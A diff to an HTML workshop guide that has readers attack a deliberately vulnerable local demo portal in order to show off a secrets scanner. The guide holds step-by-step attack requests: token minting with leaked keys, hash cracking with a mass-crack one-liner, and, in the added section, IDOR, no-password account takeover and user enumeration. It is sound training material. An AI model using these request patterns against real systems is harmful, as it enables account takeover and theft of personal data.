@@ -2,13 +2,13 @@
 <html lang="en">
 <head>
 <meta charset="UTF-8">
-<title>InsecureShield — Reproduce the BSides Talk at Home</title>
+<title>InsecureShield — Reproduce the Talk at Home</title>
 <style>
   @page {
     size: Letter;
     margin: 0.6in 0.55in 0.7in 0.55in;
     @bottom-left {
-      content: "Secrets That Survive Everything  ·  BSides Buffalo 2026  ·  @secretsifter";
+      content: "Secrets That Survive Everything  ·  Red Team Village · DEF CON 34  ·  @secretsifter";
       font-family: "Helvetica Neue", Helvetica, Arial, sans-serif;
       font-size: 8.5pt;
       color: #6B7280;
@@ -114,7 +114,10 @@
   }
   @media print {
     pre { overflow: hidden; white-space: pre; word-break: normal; font-size: 8pt; }
+    /* long copy-paste blobs must wrap fully in the PDF, never clip at the margin */
+    pre.wrapb { overflow: visible; white-space: pre-wrap; word-break: break-all; }
   }
+  pre.wrapb { white-space: pre-wrap; word-break: break-all; }
   @media screen {
     body { max-width: 980px; margin: 24px auto; padding: 0 18px; font-size: 11pt; }
     pre { font-size: 10pt; }
@@ -229,7 +232,8 @@
   <strong>What you'll do in the next 30 minutes</strong>
   ① Clone and run InsecureShield (5 min) ·
   ② Chain 1 — Azure AD credentials in <code>main.js</code> → 4,999 customer records → hash-crack → log in as the customer (15 min) ·
-  ③ Chain 2 — encrypted blob decrypted with <code>decrypt.py</code> → superadmin token → DB connection string (10 min)
+  ③ Chain 2 — encrypted blob decrypted with <code>decrypt.py</code> → superadmin token → DB connection string (10 min) ·
+  ④ Extra credit — IDOR, no-password account takeover, and a key leaked in the WebSocket handshake
 </div>
 
 <!-- =========================== SECTION 1 ============================ -->
@@ -252,12 +256,28 @@ npm start</pre>
   <ul style="margin: 4px 0 0 14px; padding: 0;">
     <li><a href="https://github.com/secretsifter/insecureshield-demo/blob/main/decrypt.py" style="color:#22C55E;"><code>decrypt.py</code></a> &mdash; reverses the CryptoJS-encrypted blob in <code>main.js</code>. Wraps the system <code>openssl</code> binary, zero pip dependencies.</li>
     <li><a href="https://github.com/secretsifter/insecureshield-demo/blob/main/crack.py" style="color:#22C55E;"><code>crack.py</code></a> &mdash; reverses a captured <code>SHA-256(password+salt)</code> hash. Reads <code>HASH:SALT</code> on stdin, tries every entry in <code>wordlist.txt</code>.</li>
-    <li><a href="https://github.com/secretsifter/insecureshield-demo/blob/main/wordlist.txt" style="color:#22C55E;"><code>wordlist.txt</code></a> &mdash; 51 realistic common passwords. Append your own line-by-line.</li>
+    <li><a href="https://github.com/secretsifter/insecureshield-demo/blob/main/wordlist.txt" style="color:#22C55E;"><code>wordlist.txt</code></a> &mdash; ~5,000 entries: real-world common passwords plus generated patterns. Append your own line-by-line.</li>
   </ul>
   <p style="margin: 6px 0 0 0; font-size: 8.5pt; color: #4B5563;">All three live at the <em>root</em> of the cloned repo (next to <code>server.js</code>) — that's where the relative-path reads expect to find each other. Run them from the project directory: <code>cd insecureshield-demo &amp;&amp; python3 decrypt.py</code>.</p>
 </div>
 
 <p>No <code>pip install</code> required for either script — both run on stock Python 3.</p>
+
+<div class="callout tool" style="margin-top:8px;">
+  <strong>Load SecretSifter in Burp (no build required)</strong>
+  <p style="margin:4px 0 0 0;">The prebuilt extension JAR ships in the same clone at <code>tools/secretsifter-store-1.2.42.jar</code>. In Burp: <strong>Extensions → Installed → Add</strong> → Extension type <em>Java</em> → select that JAR. Proxy InsecureShield through Burp and every request/response below is scanned live — the "SecretSifter catches" callouts throughout this guide tell you what to expect on each step.</p>
+</div>
+
+<div class="callout find" style="margin-top:8px;">
+  <strong>First, do your recon — open <code>/js/app.js</code></strong>
+  <p style="margin:4px 0 0 0;">Before you send a single request, open <code>http://localhost:3000/js/app.js</code> in your browser. Nothing in this guide is a value you couldn't find here yourself — a single-page app ships its whole API client to the browser, so the endpoints, methods, and request bodies are all in the JavaScript you already downloaded. Three things to notice:</p>
+  <ul style="margin:4px 0 0 14px; padding:0;">
+    <li>An <strong>endpoint catalog</strong> is written as a comment near the top — every route, its method, and its body schema (<code>POST /api/login {email,password}</code>, <code>PUT /api/profile/password {id?,currentPassword?,newPassword}</code>, the two <code>/api/admin/*</code> routes, and more).</li>
+    <li>The real <code>fetch()</code> calls show the two headers every data API requires: <code>Authorization: Bearer &lt;token&gt;</code> and <code>Ocp-Apim-Subscription-Key</code>.</li>
+    <li>Each request body below is built in this file in plain sight — so when a step shows a JSON body, you're reading the app's own code, not guessing field names.</li>
+  </ul>
+  <p style="margin:6px 0 0 0; font-size:8.5pt; color:#4B5563;">The token endpoint is self-documenting too: <code>POST /api/auth/generate-token</code> with an empty body returns <code>{"error":"appId, appKey and resourceKey are required …"}</code>, naming the exact parameters it wants.</p>
+</div>
 
 <!-- =========================== SECTION 2 ============================ -->
 
@@ -309,6 +329,8 @@ var APIM_CONFIG = {
 </div>
 
 <h3><span class="step">2.3</span>Mint an access token — Burp Repeater</h3>
+
+<div class="warn-box"><strong>Burp gotcha — set <code>Content-Type: application/json</code> on every request that has a body.</strong> The server only parses JSON bodies. When you type a body into Repeater, Burp often auto-adds <code>Content-Type: application/x-www-form-urlencoded</code> instead — the server then ignores your body and you get a confusing <strong>400</strong> (e.g. "New password must be at least 6 characters" even when it's 10). Fix the header to <code>application/json</code> and resend. This applies to steps 2.3, 2.8, 3.3, and 4.3.</div>
 
 <p>The portal's local backend mimics the Azure APIM token-exchange flow. POST the three Azure AD values as headers, the server returns a real Bearer token plus an echoed <code>resource_key</code>.</p>
 
@@ -376,7 +398,7 @@ const hash = crypto.createHash('sha256').update(c.password + salt).digest('hex')
 
 <h3><span class="step">2.7</span>Reverse the captured hash with <code>crack.py</code></h3>
 
-<p>The companion <code>crack.py</code> reads <code>HASH:SALT</code> on stdin and tries every entry in <code>wordlist.txt</code> (51 realistic patterns &mdash; <code>password</code>, <code>Pass@1234</code>, <code>P@ssw0rd</code>, <code>Welcome2024</code>, &hellip;):</p>
+<p>The companion <code>crack.py</code> reads <code>HASH:SALT</code> on stdin and tries every entry in <code>wordlist.txt</code> (~5,000 patterns &mdash; <code>password</code>, <code>Pass@1234</code>, <code>P@ssw0rd</code>, <code>Welcome2024</code>, &hellip;):</p>
 
 <pre>echo 'C123F6BF928BA0182E22850B0D3A56731620D94E493D1741F50BC66C0EFC0A91:cb590adac3c2f4af' \
   | python3 crack.py</pre>
@@ -387,7 +409,7 @@ const hash = crypto.createHash('sha256').update(c.password + salt).digest('hex')
 
 <div class="callouts">
   <div class="callout find"><strong>What you'll find</strong>The captured hash for James Mitchell (<code>CUST-001</code>) cracks to <code>Pass@1234</code>. Mass crack: pipe all 4,999 <code>HASH:SALT</code> pairs from the response through <code>crack.py</code> and watch every weak password fall.</div>
-  <div class="callout why"><strong>Why it matters</strong>The hashing is technically "salted" &mdash; but salts only defeat rainbow tables, not per-account dictionary attacks. A 51-line wordlist cracks every common password instantly. Real rockyou.txt has 14M entries.</div>
+  <div class="callout why"><strong>Why it matters</strong>The hashing is technically "salted" &mdash; but salts only defeat rainbow tables, not per-account dictionary attacks. A small ~5,000-entry wordlist cracks every common password instantly. Real rockyou.txt has 14M entries.</div>
   <div class="callout notool"><strong>Without tools</strong>Replace <code>crack.py</code> with three lines of Python plus a wordlist, or use hashcat <code>-m 1410</code> with rockyou.txt &mdash; same flow, different tooling.</div>
   <div class="callout tool"><strong>Mass-crack one-liner</strong>Pipe the API response through <code>jq</code>:<br><code>curl &hellip; /api/users | jq -r '.users[] | "\(.passwordHash):\(.salt)"' | python3 crack.py</code></div>
 </div>
@@ -414,7 +436,7 @@ Content-Type: application/json
 
 <p>The portal just authenticated you as James Mitchell. With that customer JWT (+ the APIM subscription key) you can read his profile, his policies, his claims &mdash; anything the portal exposes for the account.</p>
 
-<div class="callout why"><strong>Chain 1 closing line:</strong> "<em>From a leaked subscription key, to 4,999 hashed credentials, to a plaintext password in a 51-line wordlist, to logged in as the customer &mdash; in under two minutes. No phishing. No social engineering. Just the JavaScript file the browser downloaded.</em>"</div>
+<div class="callout why"><strong>Chain 1 closing line:</strong> "<em>From a leaked subscription key, to 4,999 hashed credentials, to a plaintext password in a small local wordlist, to logged in as the customer &mdash; in under two minutes. No phishing. No social engineering. Just the JavaScript file the browser downloaded.</em>"</div>
 
 <!-- =========================== SECTION 3 ============================ -->
 
@@ -449,10 +471,12 @@ var SECURE_SP = JSON.parse(
 
 <h3><span class="step">3.2</span>Reverse the blob with <code>decrypt.py</code> — one line</h3>
 
-<p>The demo ships a tiny Python helper at the project root. It wraps the system <code>openssl</code> binary (zero pip-install dependencies). Pipe the blob in on stdin:</p>
+<p>The demo ships a tiny Python helper at the project root. It wraps the system <code>openssl</code> binary (zero pip-install dependencies). Pipe the blob in on stdin — the complete value is below, copy the whole thing:</p>
 
-<pre>echo 'U2FsdGVkX1+SjyqRr+Wa5TUxIW5JIYPKVVHbdmtqoBoWKiMa4QMcf6rXQ/YFFKJfp...' \
+<pre class="wrapb">echo 'U2FsdGVkX1+SjyqRr+Wa5TUxIW5JIYPKVVHbdmtqoBoWKiMa4QMcf6rXQ/YFFKJfpDIdURMxdgOAjZ5SeLCXxUsXDqskoIvkU6YGSL19UAn1S21Sz0zeYDib7X+1+xEIXRIYIeqvP+o8Ux1u+FGIFGUltONuWRh0oPy7XAjn7nuN7ZapZuPp9JeBjWQdgmXDrLP6lQNMRpI28gBkEZGuozLKSn4ZKVO90aV5oG8vBAA+DbiG3W7CJfFe55606IbA9s8elDiMpUfnMCaNZfepEGITt7XAxqJoGORhfPE9un/thxO8YakbQdqqOdP/bTvAWcESk+hbfVbLWj3jMnpo97NK0gq6RCovWHMfesCQ1H5WVzNTjSKcI1EcgOcsz3sTvtUkMYaZO7A6gx0ng1lHgaYRSn8hXpDi5kxklx50TzstS7Y3lVMB/pBUBmhCqUkJE3eclAPnT+yEOAdq8xKtAZa9Or3aulZ1bi0dc5pEYn9cOCHd/KLZbXLlFCl/gxj31IerT30V19/iqOq8bNrDcKObj1e2VCqq8wtAR4nM0NrCa1TTl3SKCg/p3FUOkOfGIqFuSYknARqJGLaTunib62bFqtFyRL7CVqMy5q+Ao3a2x5xqnBWcz1zJecsJMBL/' \
   | python3 decrypt.py</pre>
+
+<p style="font-size:8.5pt;color:#6B7280;margin-top:2px;">Prefer not to copy 640 characters? Read it out of the file instead: <code>grep -oE 'ENCRYPTED_SP_CONFIG *= *"[^"]+"' public/js/main.js</code> and paste what's between the quotes. Or in DevTools, just type <code>ENCRYPTED_SP_CONFIG</code> in the console.</p>
 
 <p><strong>Expected output:</strong></p>
 
@@ -463,7 +487,8 @@ var SECURE_SP = JSON.parse(
   "resourceId":  "https://acme-portal-api.azure-api.net/admin",
   "resourceKey": "AdminRes.K3y.aB2cD3fG4hJ5kL6mN7oP8qR9sT0u1vW==",
   "authority":   "https://login.microsoftonline.com/7c1064ea-...",
-  "scope":       "admin.config.read admin.diagnostics admin.dbconn"
+  "scope":       "admin.config.read admin.diagnostics admin.dbconn",
+  "rotated_at":  "2024-10-15T00:00:00Z"
 }</pre>
 
 <div class="callout why"><strong>The reveal:</strong> a <em>second</em> Azure AD application registration was hidden in the blob — different <code>appId</code>, different <code>appKey</code>, different <code>resourceKey</code> from the public values in step 2.2. The "encryption" layer didn't protect a database connection string. It protected a more-privileged Azure app.</div>
@@ -493,14 +518,24 @@ resourceKey:  AdminRes.K3y.aB2cD3fG4hJ5kL6mN7oP8qR9sT0u1vW==
 
 <h3><span class="step">3.4</span>Reach the admin endpoint the public token couldn't touch</h3>
 
-<p>The superadmin token + the same APIM subscription key now reaches endpoints that returned <strong>403</strong> with the public token in step 2:</p>
+<p><strong>First, prove the boundary.</strong> Take the <em>public</em> admin token from step 2.3 (role <code>admin</code>, source <code>apim</code>) and aim it at the admin endpoint. The gateway rejects it — the token is valid, but its role isn't privileged enough:</p>
 
 <pre>GET /api/admin/internal-config HTTP/1.1
 Host: localhost:3000
-Authorization: Bearer &lt;superadmin token&gt;
+Authorization: Bearer &lt;public token from step 2.3&gt;
 Ocp-Apim-Subscription-Key: a1b2c3d4e5f6789012345678901234ab</pre>
 
-<p><strong>Expected response:</strong></p>
+<pre>HTTP/1.1 403 Forbidden
+{"error":"SP-sourced token required"}</pre>
+
+<p><strong>Now swap in the superadmin token</strong> from step 3.3. Same URL, same subscription key — only the token changed:</p>
+
+<pre>GET /api/admin/internal-config HTTP/1.1
+Host: localhost:3000
+Authorization: Bearer &lt;superadmin token from step 3.3&gt;
+Ocp-Apim-Subscription-Key: a1b2c3d4e5f6789012345678901234ab</pre>
+
+<p><strong>Expected response (200 OK):</strong></p>
 
 <pre>{
   "IsSuccess": true,
@@ -519,23 +554,171 @@ Ocp-Apim-Subscription-Key: a1b2c3d4e5f6789012345678901234ab</pre>
 
 <div class="callout why"><strong>Punchline read aloud:</strong> "<em>The 'encrypted' configuration hid an Azure admin app. That admin app unlocks the production database connection string — including the sa password. The encryption added one openssl call to the attack chain.</em>"</div>
 
-<!-- =========================== SECTION 4 ============================ -->
+<!-- =========================== SECTION 3.5 — EXTRA CREDIT ============================ -->
 
 <div class="pagebreak"></div>
 
-<h2><span class="num">4</span>Additional credentials — where else they hide</h2>
+<h2><span class="num">4</span>Extra credit — bonus attack primitives</h2>
+
+<p>The two chains are the headline. But once you hold a valid Bearer token and the APIM subscription key, the same portal hands you four more textbook flaws. These are the workshop "fast finisher" tasks — each is a single Repeater request. Every request below needs <em>both</em> the <code>Authorization: Bearer</code> header (any token from step 2.3) and the <code>Ocp-Apim-Subscription-Key</code>, exactly like the data APIs.</p>
+
+<div class="callout find">
+  <strong>Where these parameters come from — you're not guessing</strong>
+  <p style="margin:4px 0 0 0;">The <code>?id=</code> query params and the JSON body fields (<code>id</code>, <code>newPassword</code>, <code>userProfileID</code>) below are all disclosed by the client. The endpoint-catalog comment near the top of <code>/js/app.js</code> lists each route with its body schema, and the app's own code constructs these exact bodies. The change-password handler, for example, reads:</p>
+  <pre style="margin:6px 0 2px 0;">const body = targetId ? { id: parseInt(targetId, 10), newPassword: newPwd }
+                       : { currentPassword: currentPwd, newPassword: newPwd };</pre>
+  <p style="margin:2px 0 0 0; font-size:8.5pt; color:#4B5563;">So the field names aren't a secret — the exploit is that a legitimate, documented request shape has no authorization check behind it. Recon step: read <code>app.js</code>, or trigger the feature once in the UI and read the request in Burp's HTTP history.</p>
+</div>
+
+<h3><span class="step">4.1</span>Skip the crack — read the hash straight out of a "reset" endpoint</h3>
+
+<p>Chain 1 dumped every hash from <code>/api/users</code>. There's a quieter path: a legacy password-reset lookup that returns one user's credential material by id, with no ownership check.</p>
+
+<pre>GET /api/profile/password?id=1 HTTP/1.1
+Host: localhost:3000
+Authorization: Bearer eyJhbGc...
+Ocp-Apim-Subscription-Key: a1b2c3d4e5f6789012345678901234ab</pre>
+
+<p><strong>Expected response:</strong></p>
+
+<pre>{
+  "IsSuccess":     true,
+  "userProfileID": 1,
+  "userName":      "James Mitchell",
+  "email":         "james.mitchell@gmail.com",
+  "role":          "customer",
+  "passwordHash":  "C123F6BF928BA0182E22850B0D3A56731620D94E493D1741F50BC66C0EFC0A91",
+  "salt":          "cb590adac3c2f4af"
+}</pre>
+
+<p>Increment <code>id</code> to walk the whole customer base one record at a time. Feed the <code>passwordHash:salt</code> straight into <code>crack.py</code> from step 2.7. Same hash for James Mitchell you cracked before — this endpoint just hands it over without the 4,999-record dump.</p>
+
+<h3><span class="step">4.2</span>IDOR — read any customer's full profile</h3>
+
+<p>The profile endpoint honours an <code>?id=</code> query parameter and never checks that the id belongs to you.</p>
+
+<pre>GET /api/profile?id=2 HTTP/1.1
+Host: localhost:3000
+Authorization: Bearer eyJhbGc...
+Ocp-Apim-Subscription-Key: a1b2c3d4e5f6789012345678901234ab</pre>
+
+<p><strong>Expected response:</strong></p>
+
+<pre>{
+  "id":          "CUST-002",
+  "name":        "Sarah Thompson",
+  "email":       "sarah.thompson@outlook.com",
+  "dob":         "1985-07-22",
+  "phone":       "415-555-0202",
+  "ssn":         "XXX-XX-8832",
+  "address":     "78 Maple Ave, San Francisco, CA 94103",
+  "salt":        "4329e437404ef2f8",
+  "passwordHash":"A917B980DA07B1051F071DCBD0CDA0BAED53567AEEE5E92B2E4765631ED4FEEF",
+  "numericId":   2
+}</pre>
+
+<div class="callout why"><strong>Why it matters:</strong> a single incrementing integer is the only thing between an authenticated user and every other user's PII. This is <em>OWASP API #1 — Broken Object Level Authorization</em>, the most-reported API flaw of the last three years.</div>
+
+<h3><span class="step">4.3</span>Account takeover with no password — the BOLA reset</h3>
+
+<p>The reset endpoint accepts two body shapes — <em>both</em> are spelled out in <code>app.js</code> (the <code>targetId</code> branch shown in the callout above). Send <code>{ currentPassword, newPassword }</code> and it verifies the current password for <em>your</em> account. Send <code>{ id, newPassword }</code> and it changes <em>anyone's</em> password — no current password, no ownership check. That second shape is the app's own admin-reset path; the bug is that the server never confirms you're an admin.</p>
+
+<pre>PUT /api/profile/password HTTP/1.1
+Host: localhost:3000
+Authorization: Bearer eyJhbGc...
+Ocp-Apim-Subscription-Key: a1b2c3d4e5f6789012345678901234ab
+Content-Type: application/json
+
+{"id":4,"newPassword":"Owned#2026"}</pre>
+
+<p><strong>Expected response:</strong></p>
+
+<pre>{"message":"Password updated","userId":"CUST-004"}</pre>
+
+<p style="font-size:8.5pt;color:#6B7280;margin-top:2px;">Getting <code>{"error":"New password must be at least 6 characters"}</code> even though yours is longer? That's the Content-Type gotcha from step 2.3 — the header is <code>x-www-form-urlencoded</code>, so the server never read the body. Set it to <code>application/json</code> and resend.</p>
+
+<p>Now log in as that user with the password <em>you just set</em> — no cracking required (id 4 is Emily Davis, <code>emily.davis@gmail.com</code>):</p>
+
+<pre>POST /api/login HTTP/1.1
+Host: localhost:3000
+Content-Type: application/json
+
+{"email":"emily.davis@gmail.com","password":"Owned#2026"}</pre>
+
+<pre>{
+  "IsSuccess":  true,
+  "token":     "eyJhbGc...",
+  "role":      "customer",
+  "name":      "Emily Davis",
+  "customerId":"CUST-004"
+}</pre>
+
+<p style="font-size:8.5pt;color:#6B7280;margin-top:4px;">This step writes to the in-memory dataset — it changes id 4's password for the life of the running server. A restart (<code>npm start</code>) resets every account, so you can re-run the workshop from a clean state. Id 4 is used here so it doesn't disturb the CUST-001 hash-crack demo in Chain 1.</p>
+
+<div class="callout why"><strong>Contrast with Chain 1:</strong> steps 2.6&ndash;2.8 took over an account by <em>cracking</em> a leaked hash — realistic, but it depends on a weak password. This path takes over <em>any</em> account, strong password or not, because the server never checks who you are. Two different bugs, same outcome: logged in as someone else.</div>
+
+<h3><span class="step">4.4</span>User enumeration — <code>/api/account/info</code></h3>
+
+<p>A lookup-by-id primitive that maps an integer to a name, email, and policy number. Loop it to build a target list before the attacks above.</p>
+
+<pre>POST /api/account/info HTTP/1.1
+Host: localhost:3000
+Authorization: Bearer eyJhbGc...
+Ocp-Apim-Subscription-Key: a1b2c3d4e5f6789012345678901234ab
+Content-Type: application/json
+
+{"userProfileID":3}</pre>
+
+<pre>{
+  "IsSuccess":     true,
+  "userProfileID": 3,
+  "userName":      "Robert Chen",
+  "email":         "robert.chen@yahoo.com",
+  "policyNumber":  "POL-10004"
+}</pre>
+
+<h3><span class="step">4.5</span>The secret in the WebSocket handshake</h3>
+
+<p>Secrets don't only live in HTTP responses. The portal opens a live-notifications socket, and its very first frame — the welcome message — carries an internal API key. Point Burp's WebSocket history (or a one-line Node client) at it:</p>
+
+<pre>GET /ws/notifications?token=eyJhbGc... HTTP/1.1
+Host: localhost:3000
+Upgrade: websocket
+Connection: Upgrade</pre>
+
+<p><strong>First frame the server sends (unprompted):</strong></p>
+
+<pre>{
+  "type":    "welcome",
+  "message": "Connected to InsecureShield live notifications",
+  "server":  "prod-ws.acme-portal.internal",
+  "apiKey":  "ws-internal-key-7f3a9b2c1d4e5f6a"
+}</pre>
+
+<div class="callouts">
+  <div class="callout find"><strong>What you'll find</strong>An internal hostname (<code>prod-ws.acme-portal.internal</code>) and an API key pushed to the client the instant the socket opens — before any authentication challenge on the socket itself.</div>
+  <div class="callout why"><strong>Why it matters</strong>WebSocket traffic is a blind spot for most scanners and most reviewers. The token is even passed in the query string (<code>?token=</code>), so it lands in proxy logs and browser history too.</div>
+  <div class="callout notool"><strong>Without tools</strong>Browser DevTools → Network → WS tab → click the connection → Messages. The welcome frame is right there.</div>
+  <div class="callout tool"><strong>SecretSifter catches</strong>The <code>apiKey</code> in the WebSocket message body — SecretSifter scans WS frames, not just HTTP responses.</div>
+</div>
+
+<!-- =========================== SECTION 5 ============================ -->
+
+<div class="pagebreak"></div>
+
+<h2><span class="num">5</span>Additional credentials — where else they hide</h2>
 
 <p>The three chains aren't the only credentials in the bundle. InsecureShield scatters secrets across several files — each representing a different real-world delivery pattern. Walk these to build the muscle memory for production audits.</p>
 
-<h3><span class="step">4.1</span>/js/env.js — build-time env-var injection</h3>
+<h3><span class="step">5.1</span>/js/env.js — build-time env-var injection</h3>
 <p><strong>Pattern:</strong> Webpack <code>DefinePlugin</code> or <code>NEXT_PUBLIC_*</code> inlining. The developer wrote <code>process.env.STRIPE_SECRET_KEY</code>; the build replaced it with the literal string.</p>
 <p><strong>What you'll find:</strong> Stripe live key, SendGrid key, AWS access key + secret, Stripe webhook secret, Twilio auth token + account SID, <code>INTERNAL_API_KEY</code>, S3 bucket name. Every one of these visible in Burp's response pane on every page load.</p>
 
-<h3><span class="step">4.2</span>/js/firebase.js — Google Cloud service-account leak</h3>
+<h3><span class="step">5.2</span>/js/firebase.js — Google Cloud service-account leak</h3>
 <p><strong>Pattern:</strong> Static config import. The developer literally pasted the Firebase service-account JSON into the client bundle.</p>
 <p><strong>What you'll find:</strong> Google API key, PEM RSA private key, <code>private_key_id</code>, Firebase database URL, service account email, Firebase <code>client_id</code>.</p>
 
-<h3><span class="step">4.3</span>/asset-manifest.json — manifest-file leak</h3>
+<h3><span class="step">5.3</span>/asset-manifest.json — manifest-file leak</h3>
 <p><strong>Pattern:</strong> The build pipeline emits a manifest of asset paths and config. Often overlooked by scanners that focus on <code>.js</code> files.</p>
 <p><strong>What you'll find:</strong> AWS region, S3 bucket name, redundant AWS access key + secret, additional API keys with custom prefixes. The manifest is served with a non-JS content type — many scanners skip it.</p>
 
@@ -543,11 +726,11 @@ Ocp-Apim-Subscription-Key: a1b2c3d4e5f6789012345678901234ab</pre>
 
 <div class="pagebreak"></div>
 
-<h2><span class="num">5</span>Reproduce the 4-tool comparison</h2>
+<h2><span class="num">6</span>Reproduce the 4-tool comparison</h2>
 
 <p>This is the segment that closes the talk. Same target. Same Burp proxy. Default rules each tool. Compare what each one finds.</p>
 
-<h3><span class="step">5.1</span>Run the four tools against InsecureShield</h3>
+<h3><span class="step">6.1</span>Run the four tools against InsecureShield</h3>
 
 <ul>
   <li><strong>SecretSifter</strong> (Burp extension) — github.com/secretsifter/secretsifter-burp · BApp Store: pending</li>
@@ -558,7 +741,7 @@ Ocp-Apim-Subscription-Key: a1b2c3d4e5f6789012345678901234ab</pre>
 
 <p>For each Burp extension: proxy InsecureShield through Burp, browse the login + dashboard pages, let the passive scanners run. For TruffleHog CLI: run <code>trufflehog filesystem ./dist</code> against the built artifact.</p>
 
-<h3><span class="step">5.2</span>What to expect</h3>
+<h3><span class="step">6.2</span>What to expect</h3>
 
 <table class="table-comparison">
   <tr><th>Tool</th><th class="count">Unique creds</th><th>Notable wins</th><th>Notable misses</th></tr>
@@ -572,7 +755,7 @@ Ocp-Apim-Subscription-Key: a1b2c3d4e5f6789012345678901234ab</pre>
 
 <!-- =========================== SECTION 7 ============================ -->
 
-<h2><span class="num">6</span>Add your own detection patterns</h2>
+<h2><span class="num">7</span>Add your own detection patterns</h2>
 
 <p>If you find a credential category that SecretSifter doesn't catch, the patterns are in <code>Patterns.java</code> in the <code>burp-secret-scanner</code> repo. Each pattern is a regex plus a severity, confidence, and label.</p>
 
@@ -589,7 +772,7 @@ new Pattern(
 
 <!-- =========================== SECTION 8 ============================ -->
 
-<h2><span class="num">7</span>What to do with what you found</h2>
+<h2><span class="num">8</span>What to do with what you found</h2>
 
 <p>If you're a <strong>pentester or bug-bounty hunter</strong>: don't stop at "credential exists." Walk the chain. Call the token endpoint. Enumerate what the service principal is permitted to do. The frontend code often documents the backend endpoints you can then call.</p>
 
@@ -610,7 +793,7 @@ new Pattern(
     <li><strong>SecretSifter (Burp extension):</strong> <code>github.com/secretsifter/secretsifter-burp</code></li>
     <li><strong>Browser extension:</strong> Chrome / Firefox stores · search "SecretSifter"</li>
     <li><strong>Research preprint:</strong> <em>Secrets That Survive Everything</em> · DOI <code>10.5281/zenodo.19464446</code></li>
-    <li><strong>Conference:</strong> BSides Buffalo 2026 (June 6) · BSides SATX 2026 (June 13)</li>
+    <li><strong>Workshop:</strong> Red Team Village · DEF CON 34 (Sun Aug 9) — "Four Values in a JavaScript File"</li>
     <li><strong>Contact:</strong> @secretsifter on Bluesky · infosec.exchange</li>
   </ul>
 </div>
